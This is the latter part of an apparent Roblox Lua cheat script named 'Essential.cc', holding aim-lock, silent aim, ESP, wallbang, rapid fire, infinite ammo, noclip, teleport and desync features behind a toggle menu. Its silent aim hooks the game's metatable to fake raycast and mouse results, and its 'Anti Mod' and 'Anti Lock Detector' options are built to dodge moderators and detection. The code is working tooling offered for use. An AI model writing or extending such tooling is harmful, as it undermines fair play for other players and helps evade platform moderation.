            healthBar.Visible = false
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health <= 0 then return end

    if Locked and Settings.AimAssist then
        if not IsVictimValid() then
            UnlockTarget("Unlocked on ")
        else
            local targetPart = Victim.Character:FindFirstChild(Settings.HitPart)
            if not targetPart then
                UnlockTarget("Unlocked on ")
                return
            end
            
            CachedPart = targetPart
            local velocity = targetPart.Velocity
            local targetPos = targetPart.Position + Vector3.new(0, 1, 0) + Vector3.new(velocity.X * Settings.PredictionX, velocity.Y * Settings.PredictionY, velocity.X * Settings.PredictionX)
            local cameraPos = Camera.CFrame.Position
            local targetCFrame = CFrame.new(cameraPos, targetPos)
            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, Settings.Smoothness)
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if not Settings.LookAt or not Locked or not Victim or not Victim.Character then return end
    local localChar = player.Character
    if not localChar then return end
    local localHRP = localChar:FindFirstChild("HumanoidRootPart")
    local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
    if not localHRP or not targetHRP then return end
    local targetPos = targetHRP.Position
    local lookCFrame = CFrame.new(localHRP.Position, Vector3.new(targetPos.X, localHRP.Position.Y, targetPos.Z))
    localHRP.CFrame = lookCFrame
end)

RunService.Heartbeat:Connect(function()
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    local hum = char:FindFirstChildWhichIsA("Humanoid")
    if not hrp or not hum then return end
    
    if Settings.VelocityManipulation then
        hrp.Velocity = Vector3.new(hum.MoveDirection.X * 16, hrp.Velocity.Y, hum.MoveDirection.Z * 16)
    end
    
    if Settings.FreefallBoost then
        if not hum.FloorMaterial or hum.FloorMaterial == Enum.Material.Air then
            hrp.Velocity = Vector3.new(hrp.Velocity.X, math.clamp(hrp.Velocity.Y, -300, 300), hrp.Velocity.Z)
            hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + Vector3.new(0, 5, 0)
        end
    end
    
    if Settings.SpinBotEnabled then
        local spinSpeed = Settings.SpinBotSpeed * 0.05
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
    end
    
    if Settings.AutoAir and Locked and Victim and Victim.Character then
        local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
        local targetHumanoid = Victim.Character:FindFirstChild("Humanoid")
        if targetHRP and targetHumanoid then
            local velocityY = targetHRP.Velocity.Y
            if velocityY > 15 then
                local now = tick()
                local delayTime = math.max(0.1, Settings.AirOffset)
                if now - LastAirShot >= delayTime then
                    LastAirShot = now
                    local tool = char:FindFirstChildOfClass("Tool")
                    if tool then
                        tool:Activate()
                        if Settings.Notifications and not IsAirShooting then
                            IsAirShooting = true
                            NotificationSystem:Notify("Auto Air: " .. Victim.Name, 1)
                            task.delay(0.5, function()
                                IsAirShooting = false
                            end)
                        end
                    end
                end
            end
        end
    end
end)

local mt = getrawmetatable(game)
local oldnamecall = mt.__namecall
local oldindex = mt.__index
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    if not checkcaller() and Settings.SilentAim and CachedPartSilent then
        if self == workspace and method == "Raycast" then
            local origin = args[1]
            if origin and (origin - Camera.CFrame.Position).Magnitude < 15 then
                local targetPos = ResolvedPosition or (CachedPartSilent.Position + Vector3.new(CachedPartSilent.Velocity.X * Settings.SilentAimPrediction, CachedPartSilent.Velocity.Y * Settings.SilentAimPrediction, CachedPartSilent.Velocity.Z * Settings.SilentAimPrediction))
                return {
                    Position = targetPos,
                    Instance = CachedPartSilent,
                    Material = Enum.Material.Plastic,
                    Normal = Vector3.new(0, 1, 0)
                }
            end
        end
    end
    return oldnamecall(self, ...)
end)

mt.__index = newcclosure(function(self, key)
    if not checkcaller() and Settings.SilentAim and CachedPartSilent and self == Mouse then
        if key == "Hit" or key == "Target" then
            local targetPos = ResolvedPosition or (CachedPartSilent.Position + Vector3.new(CachedPartSilent.Velocity.X * Settings.SilentAimPrediction, CachedPartSilent.Velocity.Y * Settings.SilentAimPrediction, CachedPartSilent.Velocity.Z * Settings.SilentAimPrediction))
            if key == "Hit" then
                return CFrame.new(targetPos)
            else
                return CachedPartSilent
            end
        end
    end
    return oldindex(self, key)
end)

setreadonly(mt, true)

player.CharacterAdded:Connect(function(char)
    task.wait(1)
    if Settings.DesyncEnabled then
        StopDesync()
    end
    if Settings.ForcefieldEnabled then
        task.wait(0.5)
        CreateForcefield()
    end
    if Settings.AimAssist then
        CreateOrUpdateLockButton()
    end
    if NoJumpCooldownEnabled then
        task.wait(0.5)
        local humanoid = char:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            humanoid.UseJumpPower = false
        end
    end
    if EquipAllGunsEnabled then
        task.wait(0.5)
        setupEquipAll()
    end
    if AntiAimViewEnabled then
        task.wait(0.5)
        Bypass(char)
    end
    if ClickToTpEnabled then
        SetupClickToTp()
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if Locked and Victim == plr then
        UnlockTarget(plr.Name .. " has left")
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if EquipAllGunsEnabled then
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
            shootAllGuns()
        end
    end
end)

local AimGroup = Tabs.Main:AddLeftGroupbox('Aim Assist')

AimGroup:AddToggle('Notifications', {
    Text = 'Notifications',
    Default = true,
    Callback = function(Value)
        Settings.Notifications = Value
    end
})

AimGroup:AddToggle('EnableAimAssist', {
    Text = 'Enable Aim Assist',
    Default = false,
    Callback = function(Value)
        Settings.AimAssist = Value
        if Value then
            CreateOrUpdateLockButton()
        else
            if ScreenGui then
                ScreenGui:Destroy()
                ScreenGui = nil
                LockButtonFrame = nil
                LockButton = nil
            end
            if Locked then
                UnlockTarget("")
                NotificationSystem:Notify("Unlocked", 2)
            end
        end
    end
})

AimGroup:AddToggle('EnableLookAt', {
    Text = 'Look At Target',
    Default = false,
    Callback = function(Value)
        Settings.LookAt = Value
    end
})

AimGroup:AddToggle('EnableSilentAim', {
    Text = 'Silent Aim',
    Default = false,
    Callback = function(Value)
        Settings.SilentAim = Value
    end
})

AimGroup:AddToggle('ShowSilentAimFOV', {
    Text = 'Show Silent Aim FOV',
    Default = true,
    Callback = function(Value)
        Settings.SilentAimFOVVisible = Value
    end
})

AimGroup:AddSlider('SilentAimFOVSlider', {
    Text = 'Silent Aim FOV',
    Default = 300,
    Min = 50,
    Max = 800,
    Rounding = 0,
    Callback = function(Value)
        Settings.SilentAimFOV = Value
        if SilentCircle then
            SilentCircle.Radius = Value
        end
    end
})

AimGroup:AddInput('SilentAimPrediction', {
    Default = '0.132',
    Numeric = true,
    Finished = true,
    Text = 'Silent Aim Prediction',
    Placeholder = '0.132',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.SilentAimPrediction = num
        end
    end
})

AimGroup:AddToggle('SilentAimWallCheck', {
    Text = 'Wall Check',
    Default = true,
    Callback = function(Value)
        Settings.SilentAimWallCheck = Value
    end
})

local AirGroup = Tabs.Main:AddLeftGroupbox('Air Settings')

AirGroup:AddToggle('AutoAir', {
    Text = 'Auto Air',
    Default = false,
    Callback = function(Value)
        Settings.AutoAir = Value
    end
})

AirGroup:AddInput('AirOffsetInput', {
    Default = '0.1',
    Numeric = true,
    Finished = true,
    Text = 'Air Delay',
    Placeholder = '0.1',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.AirOffset = math.max(0.1, num)
        end
    end
})

local SpinBotGroup = Tabs.Main:AddLeftGroupbox('Spin Bot')

SpinBotGroup:AddToggle('EnableSpinBot', {
    Text = 'Enable Spin Bot',
    Default = false,
    Callback = function(Value)
        Settings.SpinBotEnabled = Value
    end
})

SpinBotGroup:AddSlider('SpinBotSpeedSlider', {
    Text = 'Spin Speed',
    Default = 50,
    Min = 1,
    Max = 100,
    Rounding = 0,
    Callback = function(Value)
        Settings.SpinBotSpeed = Value
    end
})

local PredictionGroup = Tabs.Main:AddRightGroupbox('Prediction Config')

PredictionGroup:AddToggle('AutoPrediction', {
    Text = 'Auto Prediction',
    Default = false,
    Callback = function(Value)
        Settings.AutoPrediction = Value
    end
})

PredictionGroup:AddInput('PredictionInput', {
    Default = '0.165',
    Numeric = true,
    Finished = true,
    Text = 'Prediction',
    Placeholder = '0.165',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.Prediction = num
        end
    end
})

PredictionGroup:AddInput('PredictionYInput', {
    Default = '0.165',
    Numeric = true,
    Finished = true,
    Text = 'Y (Vertical)',
    Placeholder = '0.165',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.PredictionY = num
    end
    end
})

PredictionGroup:AddInput('PredictionXInput', {
    Default = '0.165',
    Numeric = true,
    Finished = true,
    Text = 'X (Horizontal)',
    Placeholder = '0.165',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.PredictionX = num
        end
    end
})

PredictionGroup:AddInput('SmoothnessInput', {
    Default = '0.11',
    Numeric = true,
    Finished = true,
    Text = 'Smoothness',
    Placeholder = '0.11',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.Smoothness = math.max(0.01, math.min(1, num))
        end
    end
})

PredictionGroup:AddDropdown('HitpartDropdown', {
    Values = {'Head', 'Torso', 'Left Arm', 'Right Arm', 'Right Leg', 'Left Leg', 'Lower Torso', 'Feet'},
    Default = 2,
    Text = 'Hitpart',
    Callback = function(Value)
        local partMap = {
            ['Head'] = 'Head',
            ['Torso'] = 'UpperTorso',
            ['Left Arm'] = 'LeftUpperArm',
            ['Right Arm'] = 'RightUpperArm',
            ['Right Leg'] = 'RightUpperLeg',
            ['Left Leg'] = 'LeftUpperLeg',
            ['Lower Torso'] = 'LowerTorso',
            ['Feet'] = 'LeftFoot'
        }
        Settings.HitPart = partMap[Value] or 'HumanoidRootPart'
    end
})

local RageStrafeGroup = Tabs.Main:AddRightGroupbox('Rage Strafe')

RageStrafeGroup:AddToggle('TargetStrafe', {
    Text = 'Target Strafe',
    Default = false,
    Callback = function(Value)
        Settings.TargetStrafe = Value
        if Value then
            if not Settings.StrafeAngle then
                Settings.StrafeAngle = 0
            end
            NotificationSystem:Notify("Target Strafe Enabled", 2)
            if Locked and Victim then
                StartStrafe()
            end
        else
            StopStrafe()
            NotificationSystem:Notify("Target Strafe Disabled", 2)
        end
    end
})

RageStrafeGroup:AddInput('StrafeSpeedInput', {
    Default = '5',
    Numeric = true,
    Finished = true,
    Text = 'Speed',
    Placeholder = '5',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.StrafeSpeed = num
        end
    end
})

RageStrafeGroup:AddInput('StrafeHeightInput', {
    Default = '0',
    Numeric = true,
    Finished = true,
    Text = 'Height',
    Placeholder = '0',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.StrafeHeight = num
        end
    end
})

RageStrafeGroup:AddInput('StrafeDistanceInput', {
    Default = '5',
    Numeric = true,
    Finished = true,
    Text = 'Distance',
    Placeholder = '5',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            Settings.StrafeDistance = num
        end
    end
})

RageStrafeGroup:AddDropdown('StrafeMode', {
    Values = {'Orbit', 'Circle', 'Random'},
    Default = 1,
    Text = 'Strafe Mode',
    Callback = function(Value)
        Settings.StrafeMode = Value
    end
})

local BlatantGroup = Tabs.Blatant:AddLeftGroupbox('Target Aim')

BlatantGroup:AddToggle('EnableTargetAim', {
    Text = 'Enable Target Aim',
    Default = false,
    Callback = function(Value)
        Settings.TargetAim = Value
        if Value and Locked and Victim then
            NotificationSystem:Notify("Target Aim Enabled - Locked on " .. Victim.Name, 3)
        elseif not Value then
            TargetPlayer = nil
            NotificationSystem:Notify("Target Aim Disabled", 2)
        end
    end
})

BlatantGroup:AddDropdown('TargetAimMethod', {
    Values = {'FireServer', 'Raycast'},
    Default = 1,
    Text = 'Target Aim Method',
    Callback = function(Value)
        Settings.TargetAimMethod = Value
        NotificationSystem:Notify("Target Aim Method: " .. Value, 2)
    end
})

BlatantGroup:AddLabel('Info: Target Aim works when locked on')

local NoGroup = Tabs.Blatant:AddLeftGroupbox('No')

NoGroup:AddToggle('EnableNoJumpCooldown', {
    Text = 'Enable No JumpCooldown',
    Default = false,
    Callback = function(Value)
        NoJumpCooldownEnabled = Value
        if Value then
            StartNoJumpCooldown()
            NotificationSystem:Notify("No JumpCooldown Enabled", 2)
        else
            StopNoJumpCooldown()
            NotificationSystem:Notify("No JumpCooldown Disabled", 2)
        end
    end
})

NoGroup:AddToggle('EnableNoSlowdown', {
    Text = 'Enable No Slowdown',
    Default = false,
    Callback = function(Value)
        NoSlowdownEnabled = Value
        if Value then
            StartNoSlowdown()
            NotificationSystem:Notify("No Slowdown Enabled", 2)
        else
            StopNoSlowdown()
            NotificationSystem:Notify("No Slowdown Disabled", 2)
        end
    end
})

NoGroup:AddToggle('EnableNoRecoil', {
    Text = 'Enable No Recoil',
    Default = false,
    Callback = function(Value)
        NoRecoilEnabled = Value
        if Value then
            StartNoRecoil()
            NotificationSystem:Notify("No Recoil Enabled", 2)
        else
            StopNoRecoil()
            NotificationSystem:Notify("No Recoil Disabled", 2)
        end
    end
})

NoGroup:AddToggle('EnableNoclip', {
    Text = 'Enable Noclip',
    Default = false,
    Callback = function(Value)
        NoclipEnabled = Value
        if Value then
            StartNoclip()
            NotificationSystem:Notify("Noclip Enabled", 2)
        else
            StopNoclip()
            NotificationSystem:Notify("Noclip Disabled", 2)
        end
    end
})

NoGroup:AddToggle('EnableNoseat', {
    Text = 'Enable Noseat',
    Default = false,
    Callback = function(Value)
        NoseatEnabled = Value
        if Value then
            StartNoseat()
            NotificationSystem:Notify("Noseat Enabled", 2)
        else
            StopNoseat()
            NotificationSystem:Notify("Noseat Disabled", 2)
        end
    end
})

local AntiGroup = Tabs.Blatant:AddLeftGroupbox('Anti')

AntiGroup:AddToggle('EnableAntiVoid', {
    Text = 'Enable Anti Void',
    Default = false,
    Callback = function(Value)
        AntiVoidEnabled = Value
        if Value then
            StartAntiVoid()
            NotificationSystem:Notify("Anti Void Enabled", 2)
        else
            StopAntiVoid()
            NotificationSystem:Notify("Anti Void Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableAntiStomp', {
    Text = 'Enable Anti Stomp (Press P)',
    Default = false,
    Callback = function(Value)
        AntiStompEnabled = Value
        if Value then
            StartAntiStomp()
            NotificationSystem:Notify("Anti Stomp Enabled - Press P to destroy parts", 3)
        else
            StopAntiStomp()
            NotificationSystem:Notify("Anti Stomp Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableAntiMod', {
    Text = 'Enable Anti Mod',
    Default = false,
    Callback = function(Value)
        AntiModEnabled = Value
        if Value then
            StartAntiMod()
            NotificationSystem:Notify("Anti Mod Enabled", 2)
        else
            StopAntiMod()
            NotificationSystem:Notify("Anti Mod Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableAntiLockDetector', {
    Text = 'Enable Anti Lock Detector (Press T)',
    Default = false,
    Callback = function(Value)
        AntiLockDetectorEnabled = Value
        if Value then
            StartAntiLockDetector()
            NotificationSystem:Notify("Anti Lock Detector Enabled - Press T to check for lockers", 3)
        else
            StopAntiLockDetector()
            NotificationSystem:Notify("Anti Lock Detector Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableAntiAimView', {
    Text = 'Enable Anti Aim View',
    Default = false,
    Callback = function(Value)
        AntiAimViewEnabled = Value
        if Value then
            StartAntiAimView()
            NotificationSystem:Notify("Anti Aim View Enabled", 2)
        else
            StopAntiAimView()
            NotificationSystem:Notify("Anti Aim View Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableAntiFling', {
    Text = 'Enable Anti Fling',
    Default = false,
    Callback = function(Value)
        AntiFlingEnabled = Value
        if Value then
            StartAntiFling()
            NotificationSystem:Notify("Anti Fling Enabled", 2)
        else
            StopAntiFling()
            NotificationSystem:Notify("Anti Fling Disabled", 2)
        end
    end
})

AntiGroup:AddToggle('EnableDsAntiMod', {
    Text = 'Enable Ds AntiMod',
    Default = false,
    Callback = function(Value)
        DsAntiModEnabled = Value
        if Value then
            StartDsAntiMod()
            NotificationSystem:Notify("Ds AntiMod Enabled - Monitoring for Void Falls mods", 3)
        else
            StopDsAntiMod()
            NotificationSystem:Notify("Ds AntiMod Disabled", 2)
        end
    end
})

local AutosGroup = Tabs.Blatant:AddRightGroupbox('Autos')

_G.AutoReload = false
local AutoReloadConnection = nil

local function StartAutoReload()
    if AutoReloadConnection then return end
    AutoReloadConnection = RunService.Heartbeat:Connect(function()
        if _G.AutoReload then
            local character = player.Character
            if character then
                local tool = character:FindFirstChildWhichIsA("Tool")
                if tool then
                    local ammo = tool:FindFirstChild("Ammo")
                    if ammo and ammo.Value <= 0 then
                        local replicatedStorage = game:GetService("ReplicatedStorage")
                        local mainEvent = replicatedStorage:FindFirstChild("MainEvent")
                        if mainEvent then
                            mainEvent:FireServer("Reload", tool)
                            task.wait(1)
                        end
                    end
                end
            end
        end
    end)
end

local function StopAutoReload()
    if AutoReloadConnection then
        AutoReloadConnection:Disconnect()
        AutoReloadConnection = nil
    end
end

AutosGroup:AddToggle('EnableAutoReload', {
    Text = 'Enable AutoReload',
    Default = false,
    Callback = function(Value)
        _G.AutoReload = Value
        if Value then
            StartAutoReload()
            NotificationSystem:Notify("AutoReload Enabled", 2)
        else
            StopAutoReload()
            NotificationSystem:Notify("AutoReload Disabled", 2)
        end
    end
})

local AutoJumpEnabled = false
local AutoJumpConnection = nil
local AutoJumpHumanoid = nil

local function StartAutoJump()
    if AutoJumpConnection then return end
    
    local function setupJump(character)
        local humanoid = character:FindFirstChildWhichIsA("Humanoid")
        if not humanoid then return end
        AutoJumpHumanoid = humanoid
        
        AutoJumpConnection = RunService.Heartbeat:Connect(function()
            if AutoJumpEnabled and AutoJumpHumanoid and AutoJumpHumanoid.Parent and AutoJumpHumanoid.Health > 0 then
                local state = AutoJumpHumanoid:GetState()
                if state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.Landed then
                    AutoJumpHumanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    end
    
    if player.Character then
        setupJump(player.Character)
    end
    
    player.CharacterAdded:Connect(function(character)
        setupJump(character)
    end)
end

local function StopAutoJump()
    if AutoJumpConnection then
        AutoJumpConnection:Disconnect()
        AutoJumpConnection = nil
    end
    AutoJumpHumanoid = nil
end

AutosGroup:AddToggle('EnableAutoJump', {
    Text = 'Enable Auto Jump',
    Default = false,
    Callback = function(Value)
        AutoJumpEnabled = Value
        if Value then
            StartAutoJump()
            NotificationSystem:Notify("AutoJump Enabled", 2)
        else
            StopAutoJump()
            NotificationSystem:Notify("AutoJump Disabled", 2)
        end
    end
})

local AutoArmorEnabled = false
local AutoArmorConnection = nil
local BuyMaxDistance = 100

local function StartAutoArmor()
    if AutoArmorConnection then return end
    
    AutoArmorConnection = RunService.PostSimulation:Connect(function()
        if not AutoArmorEnabled then return end
        
        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local rootPart = humanoid and humanoid.RootPart or (character and character:FindFirstChild("HumanoidRootPart"))
        
        if not character or not humanoid or not rootPart then return end
        
        local ignored = workspace:FindFirstChild("Ignored") or workspace:FindFirstChild("MAP") or workspace:FindFirstChild("Blacklisted")
        
        if ignored then
            local shop = ignored:FindFirstChild("Shop") or ignored:FindFirstChild("Shops") or ignored:FindFirstChild("Pads") or ignored:FindFirstChild("BuyPads") or ignored:FindFirstChild("Bought")
            
            if shop then
                for _, child in ipairs(shop:GetChildren()) do
                    if child.Name:lower():find("armor") and child:IsA("Model") and child:FindFirstChildOfClass("ClickDetector") then
                        local head = child:FindFirstChild("Head") or child:FindFirstChild("Part")
                        if head and head:IsA("BasePart") and (head.Position - rootPart.Position).Magnitude <= BuyMaxDistance then
                            local clickDetector = child:FindFirstChildOfClass("ClickDetector")
                            if clickDetector then
                                local fireclickdetector = getgenv().fireclickdetector or function(detector)
                                    local args = {detector}
                                    local event = detector.Parent:FindFirstChild("ClickDetectorEvent") or detector.Parent.Parent:FindFirstChild("ClickDetectorEvent")
                                    if event then
                                        event:FireServer(unpack(args))
                                    end
                                end
                                fireclickdetector(clickDetector)
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function StopAutoArmor()
    if AutoArmorConnection then
        AutoArmorConnection:Disconnect()
        AutoArmorConnection = nil
    end
end

AutosGroup:AddToggle('EnableAutoArmor', {
    Text = 'Enable Auto Armor',
    Default = false,
    Callback = function(Value)
        AutoArmorEnabled = Value
        if Value then
            StartAutoArmor()
            NotificationSystem:Notify("AutoArmor Enabled", 2)
        else
            StopAutoArmor()
            NotificationSystem:Notify("AutoArmor Disabled", 2)
        end
    end
})

AutosGroup:AddInput('AutoArmorDistance', {
    Default = '100',
    Numeric = true,
    Finished = true,
    Text = 'Armor Buy Distance',
    Placeholder = '100',
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            BuyMaxDistance = num
            NotificationSystem:Notify("Armor distance set to " .. num, 2)
        end
    end
})

local GunsGroup = Tabs.Blatant:AddRightGroupbox('Guns')

GunsGroup:AddToggle('EnableWallbang', {
    Text = 'Enable Wallbang',
    Default = false,
    Callback = function(Value)
        WallbangEnabled = Value
        ToggleWallbang(Value)
        if Value then
            NotificationSystem:Notify("Wallbang Enabled", 2)
        else
            NotificationSystem:Notify("Wallbang Disabled", 2)
        end
    end
})

GunsGroup:AddToggle('EnableEquipAllGuns', {
    Text = 'Enable Equip All Guns',
    Default = false,
    Callback = function(Value)
        EquipAllGunsEnabled = Value
        if Value then
            StartEquipAllGuns()
            NotificationSystem:Notify("Equip All Guns Enabled - Click to shoot all guns!", 3)
        else
            StopEquipAllGuns()
            NotificationSystem:Notify("Equip All Guns Disabled", 2)
        end
    end
})

GunsGroup:AddToggle('EnableRapidFire', {
    Text = 'Enable Rapid Fire',
    Default = false,
    Callback = function(Value)
        RapidFireEnabled = Value
        if Value then
            StartRapidFire()
            NotificationSystem:Notify("Rapid Fire Enabled", 2)
        else
            StopRapidFire()
            NotificationSystem:Notify("Rapid Fire Disabled", 2)
        end
    end
})

GunsGroup:AddToggle('EnableInfiniteAmmo', {
    Text = 'Enable Infinite Ammo',
    Default = false,
    Callback = function(Value)
        InfiniteAmmoEnabled = Value
        if Value then
            StartInfiniteAmmo()
            NotificationSystem:Notify("Infinite Ammo Enabled", 2)
        else
            StopInfiniteAmmo()
            NotificationSystem:Notify("Infinite Ammo Disabled", 2)
        end
    end
})

-- New Tp Section (Under Guns)
local TpGroup = Tabs.Blatant:AddRightGroupbox('Tp')

TpGroup:AddToggle('EnableClickToTp', {
    Text = 'Enable Click to Tp',
    Default = false,
    Callback = function(Value)
        ClickToTpEnabled = Value
        SetupClickToTp()
        if Value then
            NotificationSystem:Notify("Click to TP Enabled - Tool added to backpack", 3)
        else
            if ClickToTpTool then
                ClickToTpTool:Destroy()
                ClickToTpTool = nil
            end
            NotificationSystem:Notify("Click to TP Disabled", 2)
        end
    end
})

-- NEW: Enable Bullet TP Toggle
TpGroup:AddToggle('EnableBulletTP', {
    Text = 'Enable Bullet TP',
    Default = false,
    Callback = function(Value)
        BulletTPEnabled = Value
        _G.BulletTPEnabled = Value
        if Value then
            NotificationSystem:Notify("Bullet TP Enabled - Bullets teleport to target!", 3)
        else
            NotificationSystem:Notify("Bullet TP Disabled", 2)
        end
    end
})

local VisualsGroup = Tabs.Visual:AddLeftGroupbox('Visuals')

VisualsGroup:AddToggle('EnableCrosshair', {
    Text = 'Enable Crosshair',
    Default = true,
    Callback = function(Value)
        Settings.CrosshairEnabled = Value
        getgenv().crosshair.enabled = Value
    end
})

VisualsGroup:AddToggle('EnableForcefield', {
    Text = 'Enable Forcefield',
    Default = false,
    Callback = function(Value)
        Settings.ForcefieldEnabled = Value
        if Value then
            CreateForcefield()
        else
            ClearForcefield()
        end
    end
})

local ESPSection = Tabs.Visual:AddLeftGroupbox('ESP')

ESPSection:AddToggle('Boxes', {
    Text = 'Boxes',
    Default = false,
    Callback = function(Value)
        ESPSettings.Boxes = Value
    end
})

ESPSection:AddToggle('Healthbar', {
    Text = 'Healthbar',
    Default = false,
    Callback = function(Value)
        ESPSettings.HealthBar = Value
    end
})

ESPSection:AddToggle('Tracers', {
    Text = 'Tracers',
    Default = false,
    Callback = function(Value)
        ESPSettings.Tracers = Value
    end
})

ESPSection:AddLabel('Box Color'):AddColorPicker('BoxColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(Value)
        ESPSettings.BoxColor = Value
    end
})

ESPSection:AddLabel('Tracers Color'):AddColorPicker('TracersColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(Value)
        ESPSettings.TracerColor = Value
    end
})

local DesyncSection = Tabs.Visual:AddLeftGroupbox('Desync')

DesyncSection:AddToggle('InvisibleDesync', {
    Text = 'Invisible Desync',
    Default = false,
    Callback = function(Value)
        if Value then
            StartDesync()
        else
            StopDesync()
        end
    end
})

DesyncSection:AddToggle('VelocityManipulation', {
    Text = 'Velocity Manipulation',
    Default = false,
    Callback = function(Value)
        Settings.VelocityManipulation = Value
    end
})

DesyncSection:AddToggle('FreefallBoost', {
    Text = 'Freefall Boost',
    Default = false,
    Callback = function(Value)
        Settings.FreefallBoost = Value
    end
})

local CFrameSection = Tabs.Visual:AddRightGroupbox('CFrame')

CFrameSection:AddToggle('CFrameToggle', {
    Text = 'Enable CFrame',
    Default = false,
    Callback = function(Value)
        Settings.CFrameEnabled = Value
        if Value then
            StartCFrameSpeed()
        else
            StopCFrameSpeed()
        end
    end
})

CFrameSection:AddSlider('CFrameSpeed', {
    Text = 'Speed',
    Default = 18,
    Min = 1,
    Max = 50,
    Rounding = 0,
    Callback = function(Value)
        Settings.CFrameSpeed = Value
    end
})

local FogSection = Tabs.Visual:AddRightGroupbox('Fog')

FogSection:AddToggle('FogToggle', {
    Text = 'Enable Fog',
    Default = false,
    Callback = function(Value)
        Settings.FogEnabled = Value
        if Value then
            if not Settings.OriginalFog then
                Settings.OriginalFog = {
                    FogStart = Lighting.FogStart,
                    FogEnd = Lighting.FogEnd,
                    FogColor = Lighting.FogColor,
                    Ambient = Lighting.Ambient,
                    OutdoorAmbient = Lighting.OutdoorAmbient,
                    Brightness = Lighting.Brightness
                }
            end
            Lighting.FogStart = 0
            Lighting.FogEnd = 200
            Lighting.FogColor = Settings.FogColor
            Lighting.Ambient = Settings.FogColor
            Lighting.OutdoorAmbient = Settings.FogColor
            Lighting.Brightness = 0.3
        else
            if Settings.OriginalFog then
                Lighting.FogStart = Settings.OriginalFog.FogStart
                Lighting.FogEnd = Settings.OriginalFog.FogEnd
                Lighting.FogColor = Settings.OriginalFog.FogColor
                Lighting.Ambient = Settings.OriginalFog.Ambient
                Lighting.OutdoorAmbient = Settings.OriginalFog.OutdoorAmbient
                Lighting.Brightness = Settings.OriginalFog.Brightness
            end
        end
    end
})

FogSection:AddLabel('Fog Color'):AddColorPicker('FogColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(Value)
        Settings.FogColor = Value
        if Settings.FogEnabled then
            Lighting.FogColor = Value
            Lighting.Ambient = Value
            Lighting.OutdoorAmbient = Value
        end
    end
})

local AntiLockSection = Tabs.Visual:AddRightGroupbox('Anti Lock')

AntiLockSection:AddToggle('EnableAntiLock', {
    Text = 'Enable Anti Lock',
    Default = false,
    Callback = function(Value)
        Settings.AntiLockEnabled = Value
        if Value then
            StartAntiLock()
        else
            StopAntiLock()
        end
    end
})

AntiLockSection:AddDropdown('AntiLockMode', {
    Text = 'Anti Lock Mode',
    Values = { 'Sky', 'Up', 'PredBreaker', 'Down', 'BreakLock' },
    Default = 1,
    Callback = function(Value)
        Settings.AntiLockMode = Value
    end
})

local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

MenuGroup:AddButton('Unload', function()
    Library:Unload()
    StopAntiLock()
    StopCFrameSpeed()
    StopStrafe()
    StopDesync()
    StopAutoReload()
    StopAutoJump()
    StopAutoArmor()
    StopNoRecoil()
    StopNoSlowdown()
    StopNoJumpCooldown()
    StopNoclip()
    StopNoseat()
    StopEquipAllGuns()
    StopRapidFire()
    StopInfiniteAmmo()
    StopAntiVoid()
    StopAntiStomp()
    StopAntiMod()
    StopAntiLockDetector()
    StopAntiAimView()
    StopAntiFling()
    StopDsAntiMod()
    ClearForcefield()
    if ClickToTpTool then
        ClickToTpTool:Destroy()
    end
    for i = 1, 8 do
        if drawings.crosshair[i] then
            drawings.crosshair[i]:Remove()
        end
    end
    for plr, data in pairs(ESP) do
        removeESP(plr)
    end
    if ScreenGui then
        ScreenGui:Destroy()
    end
    if InnalillahiMataKiri then
        InnalillahiMataKiri:Destroy()
    end
end)

MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
    Default = 'End',
    NoUI = true,
    Text = 'Menu keybind'
})

Library.ToggleKeybind = Options.MenuKeybind

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

ThemeManager:SetFolder('Essential.cc')
SaveManager:SetFolder('Essential.cc/configs')

SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])

SaveManager:LoadAutoloadConfig()

if Settings.AimAssist then
    CreateOrUpdateLockButton()
end